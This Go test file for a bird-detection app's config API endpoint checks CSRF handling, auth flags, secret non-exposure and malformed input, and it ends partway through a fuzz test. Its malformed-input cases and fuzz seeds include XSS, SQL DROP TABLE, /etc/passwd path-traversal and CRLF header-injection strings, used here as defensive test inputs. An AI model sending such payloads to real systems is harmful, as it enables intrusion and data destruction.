// app_test.go: Package api provides tests for the app config endpoint.
// This file tests /api/v2/app/config which returns security configuration,
// CSRF tokens, and version information to the frontend SPA.

package api

import (
	"encoding/json"
	"errors"
	"net/http"
	"net/http/httptest"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/gorilla/sessions"
	"github.com/labstack/echo/v4"
	"github.com/markbates/goth/gothic"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/mock"
	"github.com/stretchr/testify/require"
	"github.com/tphakala/birdnet-go/internal/api/auth"
	"github.com/tphakala/birdnet-go/internal/conf"
	"github.com/tphakala/birdnet-go/internal/datastore/mocks"
	"github.com/tphakala/birdnet-go/internal/imageprovider"
	"github.com/tphakala/birdnet-go/internal/observability"
	"github.com/tphakala/birdnet-go/internal/security"
	"github.com/tphakala/birdnet-go/internal/suncalc"
)

// =============================================================================
// Test Setup Helpers
// =============================================================================

// setupAppConfigTest creates a test environment for app config tests.
func setupAppConfigTest(t *testing.T, securityConfig *conf.Security) (*echo.Echo, *Controller) {
	t.Helper()

	e := echo.New()
	mockDS := mocks.NewMockInterface(t)

	// Use empty security config if nil
	secCfg := conf.Security{}
	if securityConfig != nil {
		secCfg = *securityConfig
	}

	settings := &conf.Settings{
		Version: "1.0.0-test",
		WebServer: conf.WebServerSettings{
			Debug: true,
		},
		Realtime: conf.RealtimeSettings{
			Audio: conf.AudioSettings{
				Export: conf.ExportSettings{
					Path: t.TempDir(),
				},
			},
		},
		Security: secCfg,
	}

	mockImageProvider := &MockImageProvider{}
	mockImageProvider.On("Fetch", mock.Anything).Return(imageprovider.BirdImage{}, nil).Maybe()

	birdImageCache := &imageprovider.BirdImageCache{}
	birdImageCache.SetImageProvider(mockImageProvider)

	sunCalc := suncalc.NewSunCalc(testHelsinkiLatitude, testHelsinkiLongitude)
	controlChan := make(chan string, testControlChannelBuf)
	mockMetrics, _ := observability.NewMetrics()

	controller, err := NewWithOptions(e, mockDS, settings, birdImageCache, sunCalc, controlChan, mockMetrics, false)
	require.NoError(t, err, "Failed to create test API controller")

	t.Cleanup(func() {
		controller.Shutdown()
		close(controlChan)
	})

	return e, controller
}

// setupAppConfigTestWithAuth creates a test environment with full auth support.
func setupAppConfigTestWithAuth(t *testing.T, securityConfig *conf.Security) (*echo.Echo, *Controller) {
	t.Helper()

	e := echo.New()
	mockDS := mocks.NewMockInterface(t)

	// Use empty security config if nil
	secCfg := conf.Security{}
	if securityConfig != nil {
		secCfg = *securityConfig
	}

	settings := &conf.Settings{
		Version: "1.0.0-test",
		WebServer: conf.WebServerSettings{
			Debug: true,
		},
		Realtime: conf.RealtimeSettings{
			Audio: conf.AudioSettings{
				Export: conf.ExportSettings{
					Path: t.TempDir(),
				},
			},
		},
		Security: secCfg,
	}

	mockImageProvider := &MockImageProvider{}
	mockImageProvider.On("Fetch", mock.Anything).Return(imageprovider.BirdImage{}, nil).Maybe()

	birdImageCache := &imageprovider.BirdImageCache{}
	birdImageCache.SetImageProvider(mockImageProvider)

	sunCalc := suncalc.NewSunCalc(testHelsinkiLatitude, testHelsinkiLongitude)
	controlChan := make(chan string, testControlChannelBuf)
	mockMetrics, _ := observability.NewMetrics()

	// Create OAuth2Server for auth
	oauth2Server := security.NewOAuth2ServerForTesting(settings)
	authService := auth.NewSecurityAdapter(oauth2Server)
	authMw := auth.NewMiddleware(authService)

	// Initialize gothic session store
	gothic.Store = sessions.NewCookieStore([]byte(settings.Security.SessionSecret))

	controller, err := NewWithOptions(e, mockDS, settings, birdImageCache, sunCalc, controlChan, mockMetrics, true,
		WithAuthMiddleware(authMw.Authenticate), WithAuthService(authService))
	require.NoError(t, err, "Failed to create test API controller with auth")

	t.Cleanup(func() {
		controller.Shutdown()
		close(controlChan)
	})

	return e, controller
}

// =============================================================================
// Integration Tests
// =============================================================================

// TestGetAppConfig_NoSecurity tests the endpoint when no security is configured.
func TestGetAppConfig_NoSecurity(t *testing.T) {
	e, controller := setupAppConfigTest(t, nil)

	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
	rec := httptest.NewRecorder()
	c := e.NewContext(req, rec)
	c.SetPath("/api/v2/app/config")

	err := controller.GetAppConfig(c)
	require.NoError(t, err)
	assert.Equal(t, http.StatusOK, rec.Code)

	var response AppConfigResponse
	err = json.Unmarshal(rec.Body.Bytes(), &response)
	require.NoError(t, err)

	// When no security is configured, accessAllowed should be true
	assert.False(t, response.Security.Enabled, "Security should be disabled")
	assert.True(t, response.Security.AccessAllowed, "Access should be allowed when security is disabled")
	assert.Equal(t, "1.0.0-test", response.Version)

	// All auth methods should be disabled
	assert.False(t, response.Security.AuthConfig.BasicEnabled)
	assert.Empty(t, response.Security.AuthConfig.EnabledProviders, "No OAuth providers should be enabled")
}

// TestGetAppConfig_BasicAuthEnabled tests the endpoint with BasicAuth enabled.
func TestGetAppConfig_BasicAuthEnabled(t *testing.T) {
	securityConfig := conf.Security{
		SessionSecret: "test-session-secret-32-chars-long",
		BasicAuth: conf.BasicAuth{
			Enabled:        true,
			Password:       "testpassword",
			ClientID:       "test-client",
			AuthCodeExp:    5 * time.Minute,
			AccessTokenExp: 24 * time.Hour,
		},
	}

	e, controller := setupAppConfigTestWithAuth(t, &securityConfig)

	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
	rec := httptest.NewRecorder()
	c := e.NewContext(req, rec)
	c.SetPath("/api/v2/app/config")

	err := controller.GetAppConfig(c)
	require.NoError(t, err)
	assert.Equal(t, http.StatusOK, rec.Code)

	var response AppConfigResponse
	err = json.Unmarshal(rec.Body.Bytes(), &response)
	require.NoError(t, err)

	assert.True(t, response.Security.Enabled, "Security should be enabled")
	assert.True(t, response.Security.AuthConfig.BasicEnabled, "BasicAuth should be enabled")
	assert.Empty(t, response.Security.AuthConfig.EnabledProviders, "No OAuth providers should be enabled")
}

// TestGetAppConfig_AllAuthMethods tests with all auth methods enabled.
func TestGetAppConfig_AllAuthMethods(t *testing.T) {
	securityConfig := conf.Security{
		SessionSecret: "test-session-secret-32-chars-long",
		BasicAuth: conf.BasicAuth{
			Enabled:        true,
			Password:       "testpassword",
			ClientID:       "test-client",
			AuthCodeExp:    5 * time.Minute,
			AccessTokenExp: 24 * time.Hour,
		},
		// Use new array-based OAuth provider configuration
		OAuthProviders: []conf.OAuthProviderConfig{
			{
				Provider:     "google",
				Enabled:      true,
				ClientID:     "google-client-id",
				ClientSecret: "google-secret",
			},
			{
				Provider:     "github",
				Enabled:      true,
				ClientID:     "github-client-id",
				ClientSecret: "github-secret",
			},
			{
				Provider:     "microsoft",
				Enabled:      true,
				ClientID:     "microsoft-client-id",
				ClientSecret: "microsoft-secret",
			},
		},
	}

	e, controller := setupAppConfigTestWithAuth(t, &securityConfig)

	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
	rec := httptest.NewRecorder()
	c := e.NewContext(req, rec)
	c.SetPath("/api/v2/app/config")

	err := controller.GetAppConfig(c)
	require.NoError(t, err)
	assert.Equal(t, http.StatusOK, rec.Code)

	var response AppConfigResponse
	err = json.Unmarshal(rec.Body.Bytes(), &response)
	require.NoError(t, err)

	assert.True(t, response.Security.Enabled)
	assert.True(t, response.Security.AuthConfig.BasicEnabled)
	assert.Contains(t, response.Security.AuthConfig.EnabledProviders, "google")
	assert.Contains(t, response.Security.AuthConfig.EnabledProviders, "github")
	assert.Contains(t, response.Security.AuthConfig.EnabledProviders, "microsoft")
}

// TestGetAppConfig_CSRFTokenFromContext tests CSRF token extraction from context.
func TestGetAppConfig_CSRFTokenFromContext(t *testing.T) {
	e, controller := setupAppConfigTest(t, nil)

	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
	rec := httptest.NewRecorder()
	c := e.NewContext(req, rec)
	c.SetPath("/api/v2/app/config")

	// Simulate CSRF middleware setting the token
	expectedToken := "test-csrf-token-abc123"
	c.Set("csrf", expectedToken)

	err := controller.GetAppConfig(c)
	require.NoError(t, err)
	assert.Equal(t, http.StatusOK, rec.Code)

	var response AppConfigResponse
	err = json.Unmarshal(rec.Body.Bytes(), &response)
	require.NoError(t, err)

	assert.Equal(t, expectedToken, response.CSRFToken, "CSRF token should match context value")
}

// TestGetAppConfig_NoCSRFToken tests that EnsureCSRFToken generates a token
// when none exists in context or cookie (Echo v4.15.0 compatibility fix).
func TestGetAppConfig_NoCSRFToken(t *testing.T) {
	e, controller := setupAppConfigTest(t, nil)

	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
	rec := httptest.NewRecorder()
	c := e.NewContext(req, rec)
	c.SetPath("/api/v2/app/config")
	// Don't set csrf in context - EnsureCSRFToken will generate one

	err := controller.GetAppConfig(c)
	require.NoError(t, err)
	assert.Equal(t, http.StatusOK, rec.Code)

	var response AppConfigResponse
	err = json.Unmarshal(rec.Body.Bytes(), &response)
	require.NoError(t, err)

	// EnsureCSRFToken now generates a token when none exists
	assert.NotEmpty(t, response.CSRFToken, "CSRF token should be generated when not in context")

	// Verify the token was also set as a cookie
	cookies := rec.Result().Cookies()
	var csrfCookie *http.Cookie
	for _, c := range cookies {
		if c.Name == "csrf" {
			csrfCookie = c
			break
		}
	}
	require.NotNil(t, csrfCookie, "CSRF cookie should be set")
	assert.Equal(t, response.CSRFToken, csrfCookie.Value, "Cookie and response token should match")
}

// TestGetAppConfig_ResponseFormat validates the JSON response structure.
func TestGetAppConfig_ResponseFormat(t *testing.T) {
	e, controller := setupAppConfigTest(t, nil)

	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
	rec := httptest.NewRecorder()
	c := e.NewContext(req, rec)
	c.SetPath("/api/v2/app/config")

	err := controller.GetAppConfig(c)
	require.NoError(t, err)

	// Verify content type
	contentType := rec.Header().Get("Content-Type")
	assert.Contains(t, contentType, "application/json", "Response should be JSON")

	// Verify JSON structure using generic map
	var rawResponse map[string]any
	err = json.Unmarshal(rec.Body.Bytes(), &rawResponse)
	require.NoError(t, err, "Response should be valid JSON")

	// Check required top-level fields exist
	assert.Contains(t, rawResponse, "csrfToken", "Response should have csrfToken field")
	assert.Contains(t, rawResponse, "security", "Response should have security field")
	assert.Contains(t, rawResponse, "version", "Response should have version field")

	// Check security sub-structure
	securityObj, ok := rawResponse["security"].(map[string]any)
	require.True(t, ok, "security should be an object")
	assert.Contains(t, securityObj, "enabled", "security should have enabled field")
	assert.Contains(t, securityObj, "accessAllowed", "security should have accessAllowed field")
	assert.Contains(t, securityObj, "authConfig", "security should have authConfig field")

	// Check authConfig sub-structure
	authConfig, ok := securityObj["authConfig"].(map[string]any)
	require.True(t, ok, "authConfig should be an object")
	assert.Contains(t, authConfig, "basicEnabled", "authConfig should have basicEnabled field")
	assert.Contains(t, authConfig, "enabledProviders", "authConfig should have enabledProviders field")
}

// TestGetAppConfig_ContentTypeHeader verifies correct content-type header.
func TestGetAppConfig_ContentTypeHeader(t *testing.T) {
	e, controller := setupAppConfigTest(t, nil)

	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
	rec := httptest.NewRecorder()
	c := e.NewContext(req, rec)
	c.SetPath("/api/v2/app/config")

	err := controller.GetAppConfig(c)
	require.NoError(t, err)

	contentType := rec.Header().Get("Content-Type")
	assert.Contains(t, contentType, "application/json", "Content-Type should be JSON")
}

// =============================================================================
// Security Tests
// =============================================================================

// TestGetAppConfig_NoSensitiveDataExposed ensures passwords/secrets are not leaked.
func TestGetAppConfig_NoSensitiveDataExposed(t *testing.T) {
	securityConfig := conf.Security{
		SessionSecret: "super-secret-session-key-do-not-leak",
		BasicAuth: conf.BasicAuth{
			Enabled:        true,
			Password:       "super-secret-password-do-not-leak",
			ClientID:       "test-client",
			AuthCodeExp:    5 * time.Minute,
			AccessTokenExp: 24 * time.Hour,
		},
		GoogleAuth: conf.SocialProvider{
			Enabled:      true,
			ClientID:     "google-client-id",
			ClientSecret: "google-super-secret-do-not-leak",
		},
	}

	e, controller := setupAppConfigTestWithAuth(t, &securityConfig)

	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
	rec := httptest.NewRecorder()
	c := e.NewContext(req, rec)
	c.SetPath("/api/v2/app/config")

	err := controller.GetAppConfig(c)
	require.NoError(t, err)

	body := rec.Body.String()

	// Ensure no secrets are exposed
	assert.NotContains(t, body, "super-secret-session-key-do-not-leak", "Session secret should not be exposed")
	assert.NotContains(t, body, "super-secret-password-do-not-leak", "Password should not be exposed")
	assert.NotContains(t, body, "google-super-secret-do-not-leak", "OAuth secrets should not be exposed")
	assert.NotContains(t, body, "google-client-id", "OAuth client IDs should not be exposed")
	assert.NotContains(t, body, "ClientSecret", "ClientSecret field should not exist")
	assert.NotContains(t, body, "Password", "Password field should not exist")
}

// TestGetAppConfig_InvalidCSRFTokenType tests behavior with non-string CSRF token.
// EnsureCSRFToken should generate a new token when the context value is invalid.
func TestGetAppConfig_InvalidCSRFTokenType(t *testing.T) {
	e, controller := setupAppConfigTest(t, nil)

	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
	rec := httptest.NewRecorder()
	c := e.NewContext(req, rec)
	c.SetPath("/api/v2/app/config")

	// Set invalid type for csrf - should not panic, will generate new token
	c.Set("csrf", 12345) // int instead of string

	err := controller.GetAppConfig(c)
	require.NoError(t, err, "Should not error with invalid CSRF token type")
	assert.Equal(t, http.StatusOK, rec.Code)

	var response AppConfigResponse
	err = json.Unmarshal(rec.Body.Bytes(), &response)
	require.NoError(t, err)

	// EnsureCSRFToken generates a new token when context value is invalid type
	assert.NotEmpty(t, response.CSRFToken, "New token should be generated when context has invalid type")
}

// TestGetAppConfig_NilAuthService tests behavior when auth service is nil.
func TestGetAppConfig_NilAuthService(t *testing.T) {
	// Create controller without auth service
	securityConfig := conf.Security{
		BasicAuth: conf.BasicAuth{
			Enabled:  true,
			Password: "test",
		},
	}

	e, controller := setupAppConfigTest(t, &securityConfig)
	// Note: setupAppConfigTest doesn't set authService, so it's nil

	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
	rec := httptest.NewRecorder()
	c := e.NewContext(req, rec)
	c.SetPath("/api/v2/app/config")

	err := controller.GetAppConfig(c)
	require.NoError(t, err, "Should handle nil auth service gracefully")
	assert.Equal(t, http.StatusOK, rec.Code)

	var response AppConfigResponse
	err = json.Unmarshal(rec.Body.Bytes(), &response)
	require.NoError(t, err)

	// With nil auth service, should fail closed (deny access)
	assert.True(t, response.Security.Enabled)
	assert.False(t, response.Security.AccessAllowed, "Should deny access when auth service is nil")
}

// =============================================================================
// Concurrency Tests
// =============================================================================

// TestGetAppConfig_Concurrent tests concurrent access to the endpoint.
func TestGetAppConfig_Concurrent(t *testing.T) {
	e, controller := setupAppConfigTest(t, nil)

	const numRequests = 100
	var wg sync.WaitGroup
	errChan := make(chan error, numRequests)

	for range numRequests {
		wg.Go(func() {
			req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
			rec := httptest.NewRecorder()
			c := e.NewContext(req, rec)
			c.SetPath("/api/v2/app/config")

			if err := controller.GetAppConfig(c); err != nil {
				errChan <- err
				return
			}

			if rec.Code != http.StatusOK {
				errChan <- echo.NewHTTPError(rec.Code, "unexpected status")
			}
		})
	}

	wg.Wait()
	close(errChan)

	for err := range errChan {
		t.Errorf("Concurrent request failed: %v", err)
	}
}

// =============================================================================
// Edge Case Tests
// =============================================================================

// TestGetAppConfig_EmptyVersion tests with empty version string.
func TestGetAppConfig_EmptyVersion(t *testing.T) {
	e := echo.New()
	mockDS := mocks.NewMockInterface(t)

	settings := &conf.Settings{
		Version: "", // Empty version
		Realtime: conf.RealtimeSettings{
			Audio: conf.AudioSettings{
				Export: conf.ExportSettings{
					Path: t.TempDir(),
				},
			},
		},
	}

	mockImageProvider := &MockImageProvider{}
	mockImageProvider.On("Fetch", mock.Anything).Return(imageprovider.BirdImage{}, nil).Maybe()
	birdImageCache := &imageprovider.BirdImageCache{}
	birdImageCache.SetImageProvider(mockImageProvider)
	sunCalc := suncalc.NewSunCalc(testHelsinkiLatitude, testHelsinkiLongitude)
	controlChan := make(chan string, testControlChannelBuf)
	mockMetrics, _ := observability.NewMetrics()

	controller, err := NewWithOptions(e, mockDS, settings, birdImageCache, sunCalc, controlChan, mockMetrics, false)
	require.NoError(t, err)

	t.Cleanup(func() {
		controller.Shutdown()
		close(controlChan)
	})

	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
	rec := httptest.NewRecorder()
	c := e.NewContext(req, rec)
	c.SetPath("/api/v2/app/config")

	err = controller.GetAppConfig(c)
	require.NoError(t, err)
	assert.Equal(t, http.StatusOK, rec.Code)

	var response AppConfigResponse
	err = json.Unmarshal(rec.Body.Bytes(), &response)
	require.NoError(t, err)

	assert.Empty(t, response.Version, "Empty version should be returned as-is")
}

// TestGetAppConfig_VersionWithSpecialChars tests version string with special characters.
func TestGetAppConfig_VersionWithSpecialChars(t *testing.T) {
	testVersions := []string{
		"1.0.0-beta+build.123",
		"v2.3.4-rc.1",
		"0.0.1-SNAPSHOT",
		"1.0.0-alpha.1+001",
		"Development Build (local)",
		"1.0.0 <script>alert('xss')</script>", // XSS attempt - should be JSON encoded
	}

	for _, version := range testVersions {
		t.Run(version, func(t *testing.T) {
			e := echo.New()
			mockDS := mocks.NewMockInterface(t)

			settings := &conf.Settings{
				Version: version,
				Realtime: conf.RealtimeSettings{
					Audio: conf.AudioSettings{
						Export: conf.ExportSettings{
							Path: t.TempDir(),
						},
					},
				},
			}

			mockImageProvider := &MockImageProvider{}
			mockImageProvider.On("Fetch", mock.Anything).Return(imageprovider.BirdImage{}, nil).Maybe()
			birdImageCache := &imageprovider.BirdImageCache{}
			birdImageCache.SetImageProvider(mockImageProvider)
			sunCalc := suncalc.NewSunCalc(testHelsinkiLatitude, testHelsinkiLongitude)
			controlChan := make(chan string, testControlChannelBuf)
			mockMetrics, _ := observability.NewMetrics()

			controller, err := NewWithOptions(e, mockDS, settings, birdImageCache, sunCalc, controlChan, mockMetrics, false)
			require.NoError(t, err)

			t.Cleanup(func() {
				controller.Shutdown()
				close(controlChan)
			})

			req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
			rec := httptest.NewRecorder()
			c := e.NewContext(req, rec)
			c.SetPath("/api/v2/app/config")

			err = controller.GetAppConfig(c)
			require.NoError(t, err)
			assert.Equal(t, http.StatusOK, rec.Code)

			var response AppConfigResponse
			err = json.Unmarshal(rec.Body.Bytes(), &response)
			require.NoError(t, err, "Response should be valid JSON regardless of version content")

			// Version should match exactly (JSON encoding handles any special chars)
			assert.Equal(t, version, response.Version)
		})
	}
}

// TestGetAppConfig_HTTPMethods tests that only GET is supported.
func TestGetAppConfig_HTTPMethods(t *testing.T) {
	e, controller := setupAppConfigTest(t, nil)

	// Only test that GET works - other methods would be rejected by router
	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
	rec := httptest.NewRecorder()
	c := e.NewContext(req, rec)
	c.SetPath("/api/v2/app/config")

	err := controller.GetAppConfig(c)
	require.NoError(t, err)
	assert.Equal(t, http.StatusOK, rec.Code)
}

// =============================================================================
// determineAccessAllowed Tests
// =============================================================================

// TestDetermineAccessAllowed_SecurityDisabled tests access when security is off.
func TestDetermineAccessAllowed_SecurityDisabled(t *testing.T) {
	e, controller := setupAppConfigTest(t, nil)

	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
	rec := httptest.NewRecorder()
	c := e.NewContext(req, rec)

	allowed := controller.determineAccessAllowed(c, false)
	assert.True(t, allowed, "Should allow access when security is disabled")
}

// TestDetermineAccessAllowed_SecurityEnabledNoAuthService tests fail-closed behavior.
func TestDetermineAccessAllowed_SecurityEnabledNoAuthService(t *testing.T) {
	e, controller := setupAppConfigTest(t, &conf.Security{
		BasicAuth: conf.BasicAuth{
			Enabled:  true,
			Password: "test",
		},
	})

	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
	rec := httptest.NewRecorder()
	c := e.NewContext(req, rec)

	allowed := controller.determineAccessAllowed(c, true)
	assert.False(t, allowed, "Should deny access when auth service is nil (fail closed)")
}

// =============================================================================
// Malformed Request Tests
// =============================================================================

// TestGetAppConfig_MalformedHeaders tests handling of malformed request headers.
func TestGetAppConfig_MalformedHeaders(t *testing.T) {
	e, controller := setupAppConfigTest(t, nil)

	testCases := []struct {
		name        string
		headerName  string
		headerValue string
	}{
		{"Empty Accept", "Accept", ""},
		{"Invalid Accept", "Accept", "invalid/type"},
		{"Null in header", "X-Custom", "value\x00with\x00nulls"},
		{"Very long header", "X-Custom", string(make([]byte, 10000))},
		{"Unicode header", "X-Custom", "日本語テスト"},
		{"Control chars", "X-Custom", "\x01\x02\x03"},
		{"CRLF attempt", "X-Custom", "value\r\nX-Injected: evil"},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
			req.Header.Set(tc.headerName, tc.headerValue)
			rec := httptest.NewRecorder()
			c := e.NewContext(req, rec)
			c.SetPath("/api/v2/app/config")

			// Should not panic and should return valid response
			err := controller.GetAppConfig(c)
			require.NoError(t, err, "Should handle malformed header: %s", tc.name)
			assert.Equal(t, http.StatusOK, rec.Code)

			var response AppConfigResponse
			err = json.Unmarshal(rec.Body.Bytes(), &response)
			require.NoError(t, err, "Response should be valid JSON")
		})
	}
}

// TestGetAppConfig_MalformedQueryParams tests handling of query parameters.
func TestGetAppConfig_MalformedQueryParams(t *testing.T) {
	e, controller := setupAppConfigTest(t, nil)

	testCases := []struct {
		name  string
		query string // Just the query string, we'll build the URL safely
	}{
		{"No query", ""},
		{"Empty query", "?"},
		{"Random param", "?foo=bar"},
		{"SQL injection attempt", "?id=1%3BDROP%20TABLE%20users"}, // URL-encoded semicolon
		{"XSS attempt", "?param=%3Cscript%3Ealert(1)%3C%2Fscript%3E"},
		{"Path traversal", "?file=..%2F..%2F..%2Fetc%2Fpasswd"},
		{"Unicode query", "?name=%E6%97%A5%E6%9C%AC%E8%AA%9E"},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			url := "/api/v2/app/config" + tc.query
			req := httptest.NewRequest(http.MethodGet, url, http.NoBody)
			rec := httptest.NewRecorder()
			c := e.NewContext(req, rec)
			c.SetPath("/api/v2/app/config")

			// Should not panic and should return valid response
			// Query params are ignored by this endpoint
			err := controller.GetAppConfig(c)
			require.NoError(t, err, "Should handle malformed query: %s", tc.name)
			assert.Equal(t, http.StatusOK, rec.Code)

			var response AppConfigResponse
			err = json.Unmarshal(rec.Body.Bytes(), &response)
			require.NoError(t, err, "Response should be valid JSON")
		})
	}
}

// TestGetAppConfig_MalformedContextValues tests handling of malformed context values.
func TestGetAppConfig_MalformedContextValues(t *testing.T) {
	e, controller := setupAppConfigTest(t, nil)

	testCases := []struct {
		name  string
		key   string
		value any
	}{
		{"Nil csrf", "csrf", nil},
		{"Int csrf", "csrf", 12345},
		{"Float csrf", "csrf", 3.14159},
		{"Bool csrf", "csrf", true},
		{"Slice csrf", "csrf", []string{"a", "b"}},
		{"Map csrf", "csrf", map[string]string{"key": "value"}},
		{"Struct csrf", "csrf", struct{ X int }{42}},
		{"Empty string csrf", "csrf", ""},
		{"Whitespace csrf", "csrf", "   \t\n   "},
		{"Very long csrf", "csrf", string(make([]byte, 100000))},
		{"Null byte csrf", "csrf", "token\x00with\x00nulls"},
		{"Unicode csrf", "csrf", "日本語トークン"},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
			rec := httptest.NewRecorder()
			c := e.NewContext(req, rec)
			c.SetPath("/api/v2/app/config")
			c.Set(tc.key, tc.value)

			// Should not panic
			err := controller.GetAppConfig(c)
			require.NoError(t, err, "Should handle malformed context value: %s", tc.name)
			assert.Equal(t, http.StatusOK, rec.Code)

			var response AppConfigResponse
			err = json.Unmarshal(rec.Body.Bytes(), &response)
			require.NoError(t, err, "Response should be valid JSON")
		})
	}
}

// TestGetAppConfig_ResponseConsistency tests that responses are consistent.
func TestGetAppConfig_ResponseConsistency(t *testing.T) {
	e, controller := setupAppConfigTest(t, nil)

	const iterations = 10
	responses := make([]AppConfigResponse, 0, iterations)

	for range iterations {
		req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
		rec := httptest.NewRecorder()
		c := e.NewContext(req, rec)
		c.SetPath("/api/v2/app/config")
		c.Set("csrf", "consistent-token")

		err := controller.GetAppConfig(c)
		require.NoError(t, err)
		assert.Equal(t, http.StatusOK, rec.Code)

		var response AppConfigResponse
		err = json.Unmarshal(rec.Body.Bytes(), &response)
		require.NoError(t, err)

		responses = append(responses, response)
	}

	// All responses should be identical
	for i := 1; i < len(responses); i++ {
		assert.Equal(t, responses[0], responses[i], "Response %d should match response 0", i)
	}
}

// TestGetAppConfig_ResponseTiming tests that response time is reasonable.
func TestGetAppConfig_ResponseTiming(t *testing.T) {
	e, controller := setupAppConfigTest(t, nil)

	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
	rec := httptest.NewRecorder()
	c := e.NewContext(req, rec)
	c.SetPath("/api/v2/app/config")

	start := time.Now()
	err := controller.GetAppConfig(c)
	duration := time.Since(start)

	require.NoError(t, err)
	assert.Equal(t, http.StatusOK, rec.Code)

	// Config endpoint should respond quickly (under 500ms)
	// Using a generous threshold to avoid flaky tests in CI
	assert.Less(t, duration.Milliseconds(), int64(500),
		"Response should be fast, got %v", duration)
}

// TestGetAppConfig_NoExtraFields tests that no unexpected fields are returned.
func TestGetAppConfig_NoExtraFields(t *testing.T) {
	e, controller := setupAppConfigTest(t, nil)

	req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
	rec := httptest.NewRecorder()
	c := e.NewContext(req, rec)
	c.SetPath("/api/v2/app/config")

	err := controller.GetAppConfig(c)
	require.NoError(t, err)

	var rawResponse map[string]any
	err = json.Unmarshal(rec.Body.Bytes(), &rawResponse)
	require.NoError(t, err)

	// Only these top-level keys should exist
	expectedKeys := map[string]bool{
		"csrfToken": true,
		"security":  true,
		"version":   true,
		"basePath":  true,
	}

	for key := range rawResponse {
		assert.True(t, expectedKeys[key], "Unexpected field in response: %s", key)
	}

	// Check security sub-object
	securityRaw, ok := rawResponse["security"]
	require.True(t, ok, "security field should exist")
	securityObj, ok := securityRaw.(map[string]any)
	require.True(t, ok, "security should be a map")
	expectedSecurityKeys := map[string]bool{
		"enabled":       true,
		"accessAllowed": true,
		"authConfig":    true,
	}

	for key := range securityObj {
		assert.True(t, expectedSecurityKeys[key], "Unexpected field in security: %s", key)
	}

	// Check authConfig sub-object
	authConfigRaw, ok := securityObj["authConfig"]
	require.True(t, ok, "authConfig field should exist")
	authConfig, ok := authConfigRaw.(map[string]any)
	require.True(t, ok, "authConfig should be a map")
	expectedAuthKeys := map[string]bool{
		"basicEnabled":     true,
		"enabledProviders": true,
	}

	for key := range authConfig {
		assert.True(t, expectedAuthKeys[key], "Unexpected field in authConfig: %s", key)
	}
}

// =============================================================================
// FUZZ TESTS
// =============================================================================

// FuzzGetAppConfig_Headers fuzzes the endpoint with various header values.
// Run with: go test -fuzz=FuzzGetAppConfig_Headers -fuzztime=30s
func FuzzGetAppConfig_Headers(f *testing.F) {
	// Add seed corpus
	f.Add("application/json", "test-value", "normal-token")
	f.Add("", "", "")
	f.Add("text/html", "x-custom-header-value", "csrf-token-123")
	f.Add("*/*", string(make([]byte, 1000)), "token\x00with\x00nulls")
	f.Add("invalid/type", "日本語", "unicode-token")
	f.Add("application/json; charset=utf-8", "\r\nX-Injected: evil", "<script>alert(1)</script>")

	f.Fuzz(func(t *testing.T, accept, customHeader, csrfToken string) {
		e := echo.New()
		mockDS := mocks.NewMockInterface(t)
		settings := &conf.Settings{
			Version: "1.0.0-fuzz",
		}

		controller := &Controller{
			DS:          mockDS,
			Settings:    settings,
			authService: nil,
		}

		req := httptest.NewRequest(http.MethodGet, "/api/v2/app/config", http.NoBody)
		if accept != "" {
			req.Header.Set("Accept", accept)
		}
		if customHeader != "" {
			req.Header.Set("X-Custom", customHeader)
		}

		rec := httptest.NewRecorder()
		c := e.NewContext(req, rec)
		c.SetPath("/api/v2/app/config")

		if csrfToken != "" {
			c.Set("csrf", csrfToken)
		}

		// Should never panic
		err := controller.GetAppConfig(c)
		if err != nil {
			// HTTP errors are acceptable
			if _, ok := errors.AsType[*echo.HTTPError](err); !ok {
				t.Errorf("Unexpected error type: %T: %v", err, err)
			}
		}

		// Response should be valid JSON if status is 200
		if rec.Code == http.StatusOK {
			var response map[string]any
			if jsonErr := json.Unmarshal(rec.Body.Bytes(), &response); jsonErr != nil {
				t.Errorf("Response is not valid JSON: %v", jsonErr)
			}
		}
	})
}

// FuzzGetAppConfig_QueryParams fuzzes the endpoint with various query parameters.
// Run with: go test -fuzz=FuzzGetAppConfig_QueryParams -fuzztime=30s
func FuzzGetAppConfig_QueryParams(f *testing.F) {
	// Add seed corpus with URL-encoded values
	f.Add("")
	f.Add("foo=bar")
	f.Add("a=1&b=2&c=3")
	f.Add("id=1")
	f.Add("param=%3Cscript%3Ealert(1)%3C%2Fscript%3E")
	f.Add("file=..%2F..%2F..%2Fetc%2Fpasswd")
	f.Add("name=%E6%97%A5%E6%9C%AC%E8%AA%9E")
	f.Add("key=value&key=value2")

	f.Fuzz(func(t *testing.T, queryString string) {
		e := echo.New()
		mockDS := mocks.NewMockInterface(t)
		settings := &conf.Settings{
			Version: "1.0.0-fuzz",
		}

		controller := &Controller{
